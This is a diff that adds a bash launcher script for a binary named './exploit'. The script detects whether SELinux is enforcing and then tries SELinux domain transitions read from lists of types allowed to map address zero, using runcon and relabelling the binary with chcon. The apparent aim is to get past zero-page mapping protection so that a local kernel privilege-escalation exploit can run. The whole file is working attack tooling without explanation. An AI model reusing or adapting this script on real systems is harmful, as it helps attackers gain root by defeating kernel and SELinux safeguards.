@@ -1,0 +1,57 @@
+#!/usr/bin/env bash
+
+EXPLOIT=./exploit
+RUNCON=/usr/bin/runcon
+
+if [ -x $EXPLOIT ]; then
+	if [ -x $RUNCON ]; then
+		SELINUX_ENFORCE=/selinux/enforce
+
+		if [ -f $SELINUX_ENFORCE ]; then
+			ENFORCE=$(cat $SELINUX_ENFORCE)
+		fi
+
+		GETENFORCE=/usr/sbin/getenforce
+
+		if [ -x $GETENFORCE ]; then
+			ENFORCE=$($GETENFORCE)
+		fi
+
+		if [ "$ENFORCE" = "1" -o "$ENFORCE" = "Enforcing" ]; then
+			source ./sesearch-mmap_zero
+
+			for TYPE in $(cat unconfined_t_trans_mmap_zero.txt); do
+				$RUNCON -t $TYPE -- $EXPLOIT
+
+				if [ $? -eq 0 ]; then
+					exit
+				fi
+			done
+
+			for TYPE in $(cat initrc_t_trans_mmap_zero.txt); do
+				$RUNCON -t initrc_t -- $RUNCON -t $TYPE -- $EXPLOIT
+
+				if [ $? -eq 0 ]; then
+					exit
+				fi
+			done
+
+			$RUNCON -t initrc_t -r system_r -- $EXPLOIT
+
+			CHCON=/usr/bin/chcon
+
+			if [ -x $CHCON ]; then
+				$CHCON -t initrc_exec_t $EXPLOIT
+
+				for TYPE in $(cat initrc_t_trans_mmap_zero.txt); do
+					$RUNCON -t initrc_t -r system_r \
+							-- $RUNCON -t $TYPE -- $EXPLOIT
+
+					if [ $? -eq 0 ]; then
+						exit
+					fi
+				done
+			fi
+		fi
+	fi
+fi
